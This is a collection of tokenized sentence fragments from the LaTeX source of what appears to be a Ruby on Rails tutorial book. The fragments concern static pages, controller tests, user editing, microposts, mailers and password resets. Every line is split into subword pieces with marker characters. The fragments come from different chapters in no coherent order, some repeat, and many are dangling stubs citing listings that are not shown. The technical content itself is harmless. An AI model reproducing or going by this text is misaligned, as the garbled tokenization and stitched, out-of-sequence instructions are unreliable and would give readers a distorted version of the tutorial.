▁Thus , ▁you ▁may ▁want ▁to ▁consider ▁remov ing ▁the ▁first ▁two ▁app s ▁before ▁proceeding , ▁which ▁you ▁can ▁do ▁by ▁navigat ing ▁to ▁the ▁\ k ode { workspace } ▁directory ▁and ▁running ▁\ k ode { rm ▁- r f ▁ hello \_ app / ▁toy \_ app / } ▁( Table ~\ ref { table : un i x _ command s }).
▁Generat ing ▁a ▁new ▁sample ▁app .
▁\ emph { Note } : ▁If ▁you ▁would ▁like ▁to ▁install ▁\ emph { all } ▁the ▁gems ▁needed ▁for ▁the ▁sample ▁application , ▁you ▁should ▁use ▁the ▁code ▁in ▁Listing ~\ ref { code : final _ gemfile } ▁at ▁this ▁time .
▁Heroku ▁recommend s ▁again st ▁using ▁different ▁database s ▁in ▁development ▁and ▁production , ▁but ▁for ▁the ▁sample ▁application ▁it ▁won ' t ▁make ▁any ▁difference , ▁and ▁SQLite ▁is ▁\ emph { much } ▁easier ▁than ▁PostgreSQL ▁to ▁install ▁and ▁configure ▁local ly
▁As ▁in ▁Chapter ~\ ref { cha : beginning } ▁and ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁I ▁suggest ▁following ▁the ▁`` hello , ▁world ! ''
▁As ▁noted ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁the ▁main ▁reason ▁for ▁this ▁is ▁that ▁the ▁default ▁Rails ▁page ▁typical ly ▁break s ▁at ▁Heroku , ▁which ▁make s ▁it ▁hard ▁to ▁tell ▁if ▁the ▁deployment ▁was ▁successful ▁or ▁not .
▁If ▁you ▁do ▁need ▁a ▁lot ▁of ▁static ▁pages , ▁take ▁a ▁look ▁at ▁the ▁\ href { https :// github . com / thoughtbot / high _ v ol tag e }{\ text tt { high \_ v ol tag e } } ▁gem .
▁We ▁go t ▁a ▁g li mp se ▁of ▁controllers ▁in ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁and ▁will ▁come ▁to ▁a ▁ deep er ▁understanding ▁once ▁we ▁explor e ▁the ▁\ href { http :// en . wiki p edia . org / wiki / Re present ation al _ State _ Transfer }{ REST ▁architecture } ▁more ▁fully ▁( start ing ▁in ▁Chapter ~\ ref { cha : modeling _ users }).
▁In ▁order ▁to ▁get ▁our ▁be ar ing s , ▁it ' s ▁helpful ▁to ▁recall ▁the ▁Rails ▁directory ▁structure ▁from ▁Section ~\ ref { sec : the _ hello _ application } ▁( F igure ~\ ref { fig : directory _ structure _ rails }).
▁To ▁get ▁started ▁with ▁static ▁pages , ▁we ' ll ▁first ▁generate ▁a ▁controller ▁using ▁the ▁same ▁Rails ▁\ k ode { generate } ▁ script ▁we ▁used ▁in ▁Chapter ~\ ref { cha : a _ toy _ app } ▁to ▁generate ▁scaffolding .
▁also ▁generates ▁a ▁controller ▁called ▁\ k ode { static \_ pages \_ controller . rb }.
▁Similar ly , ▁in ▁Chapter ~\ ref { cha : modeling _ users } ▁we ' ll ▁generate ▁a ▁\ emph { model } ▁as ▁follows :
▁When ▁you ▁get ▁to ▁Chapter ~\ ref { cha : modeling _ users }, ▁see ▁if ▁you ▁can ▁ figure ▁out ▁why .)
▁A nother ▁technique ▁related ▁to ▁models ▁involve s ▁undo ing ▁\ emph { migrations }, ▁which ▁we ▁saw ▁brief ly ▁in ▁Chapter ~\ ref { cha : a _ toy _ app } ▁and ▁will ▁see ▁much ▁more ▁of ▁starting ▁in ▁Chapter ~\ ref { cha : modeling _ users }.
▁ Content s ▁of ▁the ▁sample ▁app ' s ▁\ k ode { config } ▁directory .
▁S ince ▁we ▁included ▁the ▁\ k ode { home } ▁and ▁\ k ode { help } ▁actions ▁in ▁Listing ~\ ref { code : generating _ pages }, ▁the ▁routes ▁file ▁already ▁has ▁a ▁rule ▁for ▁each ▁one , ▁as ▁seen ▁in ▁Listing ~\ ref { code : pages _ routes }.
▁Then ▁navigate ▁to ▁\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home } ▁( F igure ~\ ref { fig : raw _ home _ view }).
▁The ▁raw ▁home ▁view ▁(\ href { http :// localhost :3000/ static _ pages / home }{/ static \_ pages / home }).
▁An ▁emphasi s ▁on ▁HTTP ▁verb s ▁is ▁typical ▁of ▁web ▁frameworks ▁( including ▁Rails ) ▁in f l u ence d ▁by ▁the ▁\ emph { REST ▁architecture }, ▁which ▁we ▁saw ▁brief ly ▁in ▁Chapter ~\ ref { cha : a _ toy _ app } ▁and ▁will ▁start ▁learning ▁about ▁more ▁in ▁Chapter ~\ ref { cha : sign _ up }.
▁You ▁may ▁note ▁that , ▁unlike ▁the ▁ demo ▁Users ▁and ▁Microposts ▁controllers ▁from ▁Chapter ~\ ref { cha : a _ toy _ app }, ▁the ▁Static ▁Pages ▁controller ▁does ▁not ▁use ▁the ▁standard ▁REST ▁actions .
▁In ▁Rails , ▁the ▁situation ▁is ▁different --- \ k ode { StaticPages Controller } ▁is ▁a ▁Ruby ▁class , ▁but ▁because ▁it ▁inherit s ▁from ▁\ k ode { Application Controller } ▁the ▁behavior ▁of ▁its ▁methods ▁is ▁specific ▁to ▁Rails : ▁when ▁visit ing ▁the ▁URL ▁/ static \_ pages / home , ▁Rails ▁look s ▁in ▁the ▁Static ▁Pages ▁controller ▁and ▁execute s ▁the ▁code ▁in ▁the ▁\ k ode { home } ▁action , ▁and ▁the n ▁render s ▁the ▁\ emph { view } ▁( the ▁ V ▁in ▁MVC ▁from ▁Section ~\ ref { sec : mvc }) ▁corresponding ▁to ▁the ▁action .
▁We ' ll ▁learn ▁in ▁Section ~\ ref { sec : slightly _ dynamic _ pages } ▁what ▁the ▁\ k ode { . erb } ▁part ▁means ; ▁from ▁the ▁\ k ode { . html } ▁part ▁you ▁ probably ▁won ' t ▁be ▁surpris ed ▁that ▁it ▁basic ally ▁look s ▁like ▁HTML ▁( Listing ~\ ref { code : raw _ home _ view }).
▁The ▁view ▁for ▁the ▁\ k ode { help } ▁action ▁is ▁analogous ▁( Listing ~\ ref { code : raw _ help _ view }).
▁A ▁custom ▁Home ▁page .
▁A ▁custom ▁Help ▁page .
▁Ou r ▁main ▁testing ▁tool s ▁will ▁be ▁\ emph { controller ▁tests } ▁( start ing ▁in ▁this ▁section ), ▁\ emph { model ▁tests } ▁( start ing ▁in ▁Chapter ~\ ref { cha : modeling _ users }), ▁and ▁\ emph { integration ▁tests } ▁( start ing ▁in ▁Chapter ~\ ref { cha : sign _ up }).
▁As ▁required , ▁initially ▁our ▁test ▁suite ▁is ▁passing ▁(\ passing ).
▁ Adding ▁the ▁\ k ode { about } ▁route .
▁The ▁Static ▁Pages ▁controller ▁with ▁added ▁\ k ode { about } ▁action .
▁Code ▁for ▁the ▁About ▁page .
▁Of ▁course , ▁it ' s ▁ never ▁a ▁ bad ▁idea ▁to ▁take ▁a ▁look ▁at ▁the ▁page ▁in ▁a ▁browser ▁to ▁make ▁sure ▁our ▁tests ▁are n ' t ▁completely ▁c ra z y ▁( F igure ~\ ref { fig : about _ us }).
▁The ▁new ▁About ▁page ▁(\ href { http :// localhost :3000/ static _ pages / about }{/ static \_ pages / about }).
▁W hether ▁a ▁changing ▁title ▁represent s ▁\ emph { t ru ly } ▁dynamic ▁content ▁is ▁ de b a table , ▁but ▁in ▁any ▁case ▁it ▁ la y s ▁the ▁necessary ▁foundation ▁for ▁un am b ig u ous ly ▁dynamic ▁content ▁in ▁Chapter ~\ ref { cha : sign _ up }.
▁The ▁( most ly ) ▁static ▁pages ▁for ▁the ▁sample ▁app .
▁We ' ll ▁write ▁simple ▁tests ▁for ▁each ▁of ▁the ▁title s ▁in ▁Table ~\ ref { table : static _ pages } ▁by ▁com bin ing ▁the ▁tests ▁in ▁Listing ~\ ref { code : about _ test } ▁with ▁the ▁\ k ode { assert \_ select } ▁method , ▁which ▁let s ▁us ▁test ▁for ▁the ▁presence ▁of ▁a ▁particular ▁HTML ▁tag ▁( s ometimes ▁called ▁a ▁`` select or '' , ▁hence ▁the ▁name )
▁The ▁Static ▁Pages ▁controller ▁test ▁with ▁title ▁tests .
▁The ▁Home ▁page ▁with ▁a ▁title .
▁The ▁view ▁for ▁the ▁Help ▁page ▁with ▁full ▁HTML ▁structure .
▁The ▁view ▁for ▁the ▁About ▁page ▁with ▁full ▁HTML ▁structure .
▁The ▁view ▁for ▁the ▁Home ▁page ▁with ▁an ▁ embedded ▁Ruby ▁title .
▁Listing ~\ ref { code : home _ view _ erb _ title } ▁is ▁our ▁first ▁example ▁of ▁ embedded ▁Ruby , ▁also ▁called ▁\ emph { ER b }.
▁ Experience d ▁Rails ▁developers ▁m ight ▁have ▁expected ▁the ▁use ▁of ▁\ k ode { content \_ for } ▁at ▁this ▁point , ▁but ▁it ▁does n ' t ▁work ▁well ▁with ▁the ▁asset ▁pipeline .
▁The ▁\ k ode { provide } ▁function ▁is ▁its ▁replace ment .
▁Then ▁we ▁can ▁make ▁the ▁corresponding ▁replace ment s ▁for ▁the ▁Help ▁and ▁About ▁pages ▁( Listing ~\ ref { code : help _ view _ erb _ title } ▁and ▁Listing ~\ ref { code : about _ view _ erb _ title }).
▁The ▁view ▁for ▁the ▁Help ▁page ▁with ▁an ▁ embedded ▁Ruby ▁title .
▁The ▁view ▁for ▁the ▁About ▁page ▁with ▁an ▁ embedded ▁Ruby ▁title .
▁The ▁result ing ▁layout ▁appears ▁in ▁Listing ~\ ref { code : application _ layout }.
▁This ▁code ▁arrange s ▁to ▁include ▁the ▁application ▁stylesheet ▁and ▁JavaScript , ▁which ▁are ▁part ▁of ▁the ▁asset ▁pipeline ▁( Section ~\ ref { sec : the _ asset _ pipeline }), ▁together ▁with ▁the ▁Rails ▁method ▁\ k ode { c s r f \_ meta \_ tag s }, ▁which ▁prevent s ▁\ href { http :// en . wiki p edia . org / wiki / C ross - site _ request _ forgery }{ c ross - site ▁request ▁ forgery } ▁( CSRF ), ▁a ▁type ▁of ▁ malicious ▁web ▁attack .
▁Of ▁course , ▁the ▁views ▁in ▁Listing ~\ ref { code : home _ view _ erb _ title }, ▁Listing ~\ ref { code : help _ view _ erb _ title }, ▁and ▁Listing ~\ ref { code : about _ view _ erb _ title } ▁are ▁ still ▁ filled ▁with ▁all ▁the ▁HTML ▁structure ▁included ▁in ▁the ▁layout , ▁so ▁we ▁have ▁to ▁remove ▁it , ▁leav ing ▁only ▁the ▁ interior ▁contents .
▁The ▁result ing ▁clean ed - up ▁views ▁appear ▁in ▁Listing ~\ ref { code : home _ view _ interior }, ▁Listing ~\ ref { code : help _ view _ interior }, ▁and ▁Listing ~\ ref { code : about _ view _ interior }.
▁The ▁Home ▁page ▁with ▁HTML ▁structure ▁removed .
▁The ▁Help ▁page ▁with ▁HTML ▁structure ▁removed .
▁The ▁About ▁page ▁with ▁HTML ▁structure ▁removed .
▁( A t ▁this ▁point , ▁I ▁also ▁recommend ▁remov ing ▁the ▁\ k ode { hello } ▁action ▁from ▁the ▁Application ▁controller ▁if ▁you ▁added ▁it ▁in ▁Section ~\ ref { sec : sample _ app _ setup }. )
▁As ▁show n ▁in ▁Listing ~\ ref { code : home _ root _ route }, ▁this ▁means ▁replacing ▁the ▁generated ▁\ k ode { get } ▁rule ▁from ▁Listing ~\ ref { code : pages _ routes } ▁with ▁the ▁following ▁code :
▁The ▁Home ▁page ▁at ▁the ▁root ▁route .
▁Then ▁merge ▁the ▁changes ▁back ▁into ▁the ▁master ▁branch ▁using ▁the ▁same ▁technique ▁as ▁in ▁Section ~\ ref { sec : git _ command s }
▁The ▁Static ▁Pages ▁controller ▁test ▁with ▁a ▁base ▁title .
▁This ▁requires ▁the ▁\ href { https :// github . com / meta skills / mini _ backtrace }{\ text tt { mini \_ backtrace } } ▁gem ▁included ▁in ▁Listing ~\ ref { code : gemfile _ sample _ app }, ▁combine d ▁with ▁a ▁\ emph { backtrace ▁ silencer }.
▁Guard ▁m on it or s ▁changes ▁in ▁the ▁file system ▁so ▁that , ▁for ▁example , ▁when ▁we ▁change ▁the ▁\ k ode { static \_ pages \_ controller \_ test . rb } ▁file , ▁only ▁those ▁tests ▁get ▁run .
▁The ▁( rather ▁subtle ) ▁gear ▁icon ▁in ▁the ▁file ▁navigat or ▁p an e .
▁Show ing ▁hidden ▁files ▁in ▁the ▁file ▁navigat or .
▁The ▁normally ▁hidden ▁\ k ode { . gitignore } ▁file ▁made ▁visible .
▁< n > end
▁Change ▁the ▁content ▁of ▁the ▁\ k ode { hello } ▁action ▁in ▁Listing ~\ ref { code : hello _ action } ▁to ▁read ▁`` hola , ▁ mundo ! '' ▁instead ▁of ▁`` hello , ▁world ! ''.
▁Fix ing ▁this ▁blemish ▁requires ▁a ▁significant ly ▁more ▁complicated ▁regular ▁expression ▁and ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : modeling _ users _ exercises }).)
▁\ chapter { A ▁toy ▁app } ▁% ▁( fold )< n >\ label { cha : a _ toy _ app }< n >< n >
▁in ▁Listing ~\ ref { code : hello _ action _ redux } ▁and
▁< n >< n > The n ▁commit ▁the ▁changes ▁and ▁push ▁up ▁to ▁Heroku :
▁create ▁app
▁create ▁app
▁as ▁show n ▁in ▁Listing ~\ ref { code : first _ migration }.
▁in ▁Listing ~\ ref { code : rails _ routes }.
▁in ▁Listing ~\ ref { code : demo _ microposts _ controller }.
▁\ chapter { Updating , ▁show ing , ▁and ▁deleting ▁users } ▁% ▁( fold )< n >\ label { cha : updating _ showing _ and _ deleting _ users }< n >< n >
▁We ' ll ▁start ▁by ▁giv ing ▁users ▁the ▁ability ▁to ▁update ▁their ▁profile s , ▁which ▁will ▁also ▁provide ▁a ▁natural ▁opportunit y ▁to ▁enforce ▁an ▁authorization ▁model ▁( ma de ▁possible ▁by ▁the ▁authentication ▁code ▁in ▁Chapter ~\ ref { cha : basic _ login }).
▁The ▁authentication ▁machinery ▁from ▁Chapter ~\ ref { cha : basic _ login } ▁will ▁allow ▁us ▁to ▁use ▁a ▁\ emph { before ▁filter } ▁to ▁ensure ▁that ▁this ▁is ▁the ▁case .
▁Note ▁how ▁close ly ▁this ▁re s em b le s ▁the ▁new ▁user ▁view ▁from ▁Listing ~\ ref { code : signup _ form } ; ▁the ▁large ▁ overlap ▁suggest s ▁factor ing ▁the ▁repeated ▁code ▁into ▁a ▁partial , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ edit _ form }).
▁in ▁Listing ~\ ref { code : user _ edit _ view }.
▁in ▁Listing ~\ ref { code : new _ edit _ partial }.
▁One ▁nice ▁effect ▁of ▁build ing ▁the ▁authentication ▁machinery ▁in ▁Chapter ~\ ref { cha : basic _ login } ▁is ▁that ▁we ▁are ▁now ▁in ▁a ▁position ▁to ▁implement ▁authorization ▁as ▁well .
▁( Test ing ▁for ▁this ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ friendly _ forwarding }).)
▁In ▁this ▁section , ▁we ' ll ▁add ▁the ▁\ href { http :// www . d ic t ion ary . com / b row se / p en ultimate }{ p en ultimate } ▁user ▁action , ▁the ▁\ k ode { index } ▁action , ▁which ▁is ▁design ed ▁to ▁display ▁\ emph { all } ▁the ▁users ▁instead ▁of ▁just ▁one .
▁The ▁code ▁in ▁Listing ~\ ref { code : user _ index _ view } ▁uses ▁the ▁result ▁of ▁Listing ~\ ref { code : gravatar _ option _ redux } ▁from ▁Section ~\ ref { sec : exercises _ a _ gravatar _ image }, ▁which ▁allows ▁us ▁to ▁pass ▁an ▁option ▁to ▁the ▁Gravatar ▁helper ▁specify ing ▁a ▁size ▁other ▁than ▁the ▁default .
▁If ▁you ▁did n ' t ▁do ▁that ▁exercise , ▁update ▁your ▁Users ▁helper ▁file ▁with ▁the ▁contents ▁of ▁Listing ~\ ref { code : gravatar _ option _ redux } ▁before ▁proceeding .
▁in ▁Listing ~\ ref { code : index _ final _ refactoring } ▁and
▁Because ▁of ▁its ▁ import ance , ▁it ' s ▁a ▁good ▁idea ▁to ▁write ▁a ▁test ▁for ▁any ▁attribute ▁that ▁is n ' t ▁edit able , ▁and ▁writing ▁such ▁a ▁test ▁for ▁the ▁\ k ode { admin } ▁attribute ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ administrative _ users }).
▁\ chapter { User ▁microposts }< n >\ label { cha : user _ microposts }< n >< n >
▁in ▁Listing ~\ ref { code : micropost _ model }.
▁in ▁Listing ~\ ref { code : generate _ micropost _ model }.
▁in ▁Listing ~\ ref { code : micropost _ user _ id _ validation }.
▁in ▁Listing ~\ ref { code : micropost _ validity _ test }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : micropost _ validations _ tests }.
▁The ▁micropost ▁count ▁assertion ▁in ▁Listing ~\ ref { code : user _ profile _ test } ▁uses ▁\ k ode { response . body }, ▁which ▁we ▁saw ▁brief ly ▁in ▁the ▁Chapter ~\ ref { cha : password _ reset } ▁ exercises ▁( Section ~\ ref { sec : exercises _ password _ reset _ test }).
▁( H a v ing ▁so ▁much ▁code ▁in ▁each ▁branch ▁of ▁the ▁\ k ode { if } - \ k ode { else } ▁condition al ▁is ▁a ▁bit ▁me s s y , ▁and ▁clean ing ▁it ▁up ▁using ▁partials ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ creating _ microposts }).)
▁We ' ll ▁accomplish ▁this ▁using ▁the ▁\ k ode { where } ▁method ▁on ▁the ▁\ k ode { Micropost } ▁model ▁( see n ▁brief ly ▁before ▁in ▁Section ~\ ref { sec : exercises _ activation _ test _ and _ refactoring }), ▁as ▁show n ▁in ▁Listing ~\ ref { code : proto _ status _ feed }
▁Writ ing ▁an ▁automate d ▁test ▁for ▁image ▁upload ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ basic _ image _ upload }).
▁in ▁Listing ~\ ref { code : skip _ re size _ initialize r }.
▁in ▁Listing ~\ ref { code : generate _ user _ mailer }.
▁The ▁password ▁reset ▁mailer ▁method ▁needed ▁to ▁get ▁this ▁working ▁is ▁ nearly ▁identical ▁to ▁the ▁mailer ▁for ▁account ▁activation ▁ developed ▁in ▁Section ~\ ref { sec : account _ activation _ email s }.
▁As ▁with ▁account ▁activation ▁email s ▁( Section ~\ ref { sec : account _ activation _ email s }), ▁we ▁can ▁preview ▁password ▁reset ▁email s ▁using ▁the ▁Rails ▁email ▁preview er .
▁as ▁show n ▁in ▁Listing ~\ ref { code : password _ reset _ mailer _ test }.
▁in ▁Listing ~\ ref { code : password _ reset _ mailer _ test }.
▁in ▁Listing ~\ ref { code : password _ reset _ update _ action }.
▁( L ac k ing ▁the ▁p at i ence ▁to ▁wait ▁two ▁hours , ▁we ' ll ▁cover ▁the ▁third ▁branch ▁in ▁a ▁test , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ updating _ the _ reset }).)
▁in ▁Listing ~\ ref { code : update _ columns }.
▁As ▁show n ▁in ▁Listing ~\ ref { code : s end gr id _ config _ redux }, ▁you ▁will ▁also ▁have ▁to ▁define ▁a ▁\ k ode { host } ▁variable ▁with ▁the ▁address ▁of ▁your ▁production ▁website .
▁as ▁seen ▁in ▁Listing ~\ ref { code : user _ model _ password _ reset _ expired }.
▁in ▁Listing ~\ ref { code : account _ activation s _ route }.
▁in ▁Listing ~\ ref { code : user _ model _ activation _ code } ▁and
▁as ▁show n ▁in ▁Listing ~\ ref { code : generate _ user _ mailer }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : c g i _ escape }.
▁To ▁see ▁the ▁results ▁of ▁the ▁templates ▁defined ▁in ▁Listing ~\ ref { code : account _ activation _ view _ text } ▁and ▁Listing ~\ ref { code : account _ activation _ view _ html }, ▁we ▁can ▁use ▁\ emph { email ▁preview s }, ▁which ▁are ▁special ▁URLs ▁expose d ▁by ▁Rails ▁to ▁let ▁us ▁see ▁what ▁our ▁email ▁messages ▁look ▁like .
▁After ▁restart ing ▁the ▁development ▁server ▁to ▁activate ▁the ▁configuration ▁in ▁Listing ~\ ref { code : development _ email _ settings }, ▁we ▁next ▁need ▁to ▁update ▁the ▁User ▁mailer ▁\ emph { preview ▁file }, ▁which ▁was ▁automatically ▁generated ▁in ▁Section ~\ ref { sec : account _ activation _ email s }, ▁as ▁show n ▁in ▁Listing ~\ ref { code : generated _ user _ mailer _ preview s }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : test _ domain _ host }.
▁in ▁Listing ~\ ref { code : re al _ account _ activation _ test }.
▁Section ~\ ref { sec : activation _ email _ in _ production } ▁discuss es ▁how ▁to ▁send ▁email ▁for ▁real ▁in ▁a ▁production ▁environment .
▁Recall ▁from ▁the ▁discussion ▁in ▁Section ~\ ref { sec : mailer _ template s } ▁that ▁the ▁activation ▁token ▁and ▁email ▁are ▁available ▁as ▁\ k ode { params [: id ]} ▁and ▁\ k ode { params [: email ]} , ▁respectively .
▁is ▁equivalent ▁to
▁( T h at ▁refinement ▁is ▁prevent ing ▁un activated ▁users ▁from ▁being ▁displayed , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ activation _ test _ and _ refactoring }).)
▁Find ing ▁a ▁user ▁to ▁follow .
▁The ▁profile ▁of ▁a ▁user ▁to ▁follow , ▁with ▁a ▁follow ▁button .
▁A ▁profile ▁with ▁an ▁unfollow ▁button ▁and ▁increment ed ▁followers ▁count .
▁The ▁Home ▁page ▁with ▁status ▁feed ▁and ▁increment ed ▁following ▁count .
▁as ▁seen ▁in ▁Listing ~\ ref { code : empty _ relationship _ fixture }.
▁in ▁Listing ~\ ref { code : u til ity _ method _ tests }.
▁Listing ~\ ref { code : has _ many _ following _ through _ passive _ relationships } ▁keep s ▁the ▁\ k ode { : source } ▁key ▁to ▁emphasize ▁the ▁parallel ▁structure ▁with ▁the ▁\ k ode { has \_ many ▁: following } ▁association .
▁in ▁Listing ~\ ref { code : sample _ relationships }.
▁24 , ▁2 5 , ▁2 6 , ▁ 27 , ▁28 , ▁29 , ▁30 , ▁31 , ▁3 2 , ▁3 3 , ▁ 34 , ▁3 5 , ▁ 36 , ▁ 37 , ▁ 38 , ▁ 39 , ▁4 0, ▁4 1, < n > 4 2 ,
▁\ href { https :// www . code school . com /}{ C ode ▁School } : ▁A ▁large ▁variety ▁of ▁interactive ▁programming ▁course s
▁In ▁Chapter ~\ ref { cha : account _ activation }, ▁we ' ll ▁make ▁\ emph { s ure } ▁of ▁email ▁validity ▁by ▁adding ▁a ▁separate ▁\ emph { account ▁activation } ▁step ▁to ▁user ▁signup .
▁as ▁show n ▁in ▁Listing ~\ ref { code : development _ debugger }.
▁in ▁Listing ~\ ref { code : signup _ form _ html }.
▁( Writ ing ▁a ▁test ▁for ▁the ▁error ▁messages ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ a _ test _ for _ invalid _ submission }).)
▁ Adding ▁lines ▁to ▁check ▁for ▁the ▁appearance ▁of ▁error ▁messages ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ a _ test _ for _ invalid _ submission }).
▁in ▁Listing ~\ ref { code : post _ signup } ▁and
▁find ▁by
▁( It ' s ▁ probably ▁a ▁good ▁idea ▁to ▁write ▁a ▁test ▁for ▁the ▁flash ▁as ▁well , ▁which ▁is ▁left ▁as ▁an ▁exercise ▁( Section ~\ ref { sec : exercises _ a _ test _ for _ valid _ submission }).)
▁in ▁Listing ~\ ref { code : user _ create _ action }.
▁in ▁Listing ~\ ref { code : production _ web server _ config }.
▁as ▁show n ▁in ▁Listing ~\ ref { code : proc file }.
▁\ chapter { From ▁ zero ▁to ▁deploy } ▁% ▁( fold )< n >\ label { cha : beginning }< n >< n >
▁Then , ▁in ▁Chapter ~\ ref { cha : filling _ in _ the _ layout } ▁through ▁Chapter ~\ ref { cha : password _ reset }, ▁we ' ll ▁complete ▁the ▁foundation ▁for ▁the ▁sample ▁application ▁by ▁making ▁a ▁site ▁layout , ▁a ▁user ▁data ▁model , ▁and ▁a ▁full ▁re g ist r ation ▁and ▁authentication ▁system ▁( including ▁account ▁activation ▁and ▁password ▁resets ).
▁< n >< n > ▁\ subsection { P r er equ i site s } ▁% ▁( fold )< n > ▁\ label { sec : prerequisites }< n >< n > The re ▁are ▁no ▁form al ▁ prerequisites ▁to ▁this ▁book , ▁and ▁the ▁\ emph {
▁\ href { https :// www . code school . com /}{ C ode ▁School } : ▁G ood ▁interactive ▁online ▁programming ▁course s
▁ Turbolinks
▁in ▁Listing ~\ ref { code : install ing _ rails }.
▁Having ▁defined ▁an ▁action ▁that ▁returns ▁the ▁desired ▁string , ▁we ▁need ▁to ▁tell ▁Rails ▁to ▁use ▁that ▁action ▁instead ▁of ▁the ▁default ▁page ▁in ▁F igure ~\ ref { fig : riding _ rails }.
▁The ▁syntax ▁look s ▁like ▁this :
▁in ▁Listing ~\ ref { code : hello _ root _ route }.
▁In ▁addition ▁to ▁focus ing ▁on ▁general ▁principle s ▁of ▁web ▁development ▁( rather ▁than ▁on ▁Rails ▁specifically ), ▁the ▁\ r or t \ ▁teach es ▁the ▁broad er ▁ s k i ll ▁of ▁\ emph { technical ▁sophistication } ▁( B o x ~\ ref { aside : technical _ so ph ist ic ation }), \ foo t not e { \ x k cd use . } ▁which ▁is ▁a ▁principal ▁the me ▁ developed ▁by ▁the ▁\ let b d \ ▁tutorial s . \ foo t not e { learn en ough . com / s tory } ▁In ▁particular , ▁the ▁ Learn ▁E n ough ▁introduc tory ▁sequence ▁consist s ▁of ▁a ▁series ▁of ▁tutorial s ▁that ▁are ▁suit able ▁as ▁ prerequisites ▁to ▁the ▁\ r or t , ▁starting ▁with ▁\ le c l , \ foo t not e { learn en ough . com / command - line } ▁which ▁( un like ▁the ▁present ▁tutorial ) ▁is ▁a i m ed ▁at ▁complete ▁beginners . < n >< n >< n >\ begin { aside }< n >\ label { aside : technical _ so ph ist ic ation }< n >\ head ing { Technical ▁sophistication }< n >< n > The ▁\ r or t \ ▁is ▁part ▁of ▁the ▁\ let b d \ ▁f am ily ▁of ▁tutorial s , ▁which ▁develop ▁the ▁the me ▁of ▁\ emph { technical ▁sophistication } : ▁the ▁combination ▁of ▁hard ▁and ▁so f t ▁ skills ▁that ▁make ▁it ▁seem ▁like ▁you ▁can ▁magic ally ▁solve ▁any ▁technical ▁problem ▁( F igure ~\ ref { fig : tech _ support _ ch e at _ sheet }). ▁Web ▁development , ▁and ▁computer ▁programming ▁in ▁general , ▁are ▁essential ▁components ▁of ▁technical ▁sophistication , ▁but ▁there ' s ▁more ▁to ▁it ▁than ▁that --- you ▁also ▁have ▁to ▁know ▁how ▁to ▁click ▁around ▁menu ▁items ▁to ▁learn ▁the ▁capabilities ▁of ▁a ▁particular ▁application , ▁how ▁to ▁cl ar ify ▁a ▁confusing
▁message ▁by ▁\ href { http :// l m gt f y . com /}{ G oo g l ing ▁it }, ▁or ▁when ▁to ▁give ▁up ▁and ▁just ▁re b oo t ▁the ▁d ar n ▁thing . < n >< n > Because ▁web ▁applications ▁have ▁so ▁many ▁mov ing ▁parts , ▁they ▁offer ▁ ample ▁opportunit ies ▁to ▁develop ▁your ▁technical ▁sophistication . ▁In ▁the ▁context ▁of ▁Rails ▁web ▁development , ▁some ▁specific ▁examples ▁of ▁technical ▁sophistication ▁include ▁making ▁sure ▁you ' re ▁using ▁the ▁right ▁Ruby ▁gem ▁versions , ▁running ▁\ text tt { bundle ▁install } ▁or ▁\ text tt { bundle ▁update }, ▁and ▁restart ing ▁the ▁local ▁webserver ▁if ▁something ▁does n ' t ▁work . ▁( Do n ' t ▁worry ▁if ▁all ▁this ▁ s ound s ▁like ▁g i b b er is h ; ▁we ' ll ▁cover ▁everything ▁mentioned ▁here ▁in ▁the ▁course ▁of ▁com p let ing ▁this ▁tutorial . )< n >< n > As ▁you ▁proceed ▁through ▁this ▁tutorial , ▁in ▁all ▁like li h ood ▁you ▁will ▁ o cc as ion ally ▁be ▁tr ip ped ▁up ▁by ▁things ▁not ▁immediately ▁working ▁as ▁expected . ▁A lthough ▁some ▁particular ly ▁trick y ▁steps ▁are ▁explicitly ▁highlight ed ▁in ▁the ▁text , ▁it ▁is ▁i mp ossible ▁to ▁an tic ip ate ▁all ▁the ▁things ▁that ▁can ▁go ▁wrong . ▁I ▁recommend ▁you ▁ em b ra ce ▁these ▁in evi table ▁ st um b l ing ▁blocks ▁as ▁opportunit ies ▁to ▁work ▁on ▁i mprov ing ▁your ▁technical ▁sophistication . ▁Or , ▁as ▁we ▁say ▁in ▁\ href { https :// www . learn en ough . com / command - line - tutorial # aside - s p e a k _ ge e k }{ ge e k ▁sp e a k } : ▁\ emph { It ' s ▁not ▁a ▁bug , ▁it ' s ▁a ▁feature ! }< n >< n >\ end { aside }< n >< n >\ begin { figure }< n >\ begin { center }< n >\ image { images / figures / tech _ support _ ch e at _ sheet . png }< n >\ end { center }< n >\ caption { ` ` \ href { https :// m . x k cd . com / 6 27 /}{ T e ch ▁Support ▁C h e at ▁S h e et } '' ▁( via ▁\ href { http :// x k cd . com /}{ x k cd }). ▁\ label { fig : tech _ support _ ch e at _ sheet } }< n >\ end { figure }< n >< n >< n > The ▁\ emph {
▁Then , ▁in ▁Chapter ~\ ref { cha : filling _ in _ the _ layout } ▁through ▁Chapter ~\ ref { cha : password _ reset }, ▁we ' ll ▁complete ▁the ▁foundation ▁for ▁the ▁sample ▁application ▁by ▁making ▁a ▁site ▁layout , ▁a ▁user ▁data ▁model , ▁and ▁a ▁full ▁re g ist r ation ▁and ▁authentication ▁system ▁( including ▁account ▁activation ▁and ▁password ▁resets ).
▁\ href { https :// www . code school . com /}{ C ode ▁School } : ▁G ood ▁interactive ▁online ▁programming ▁course s
▁in ▁Listing ~\ ref { code : rails _ command }.
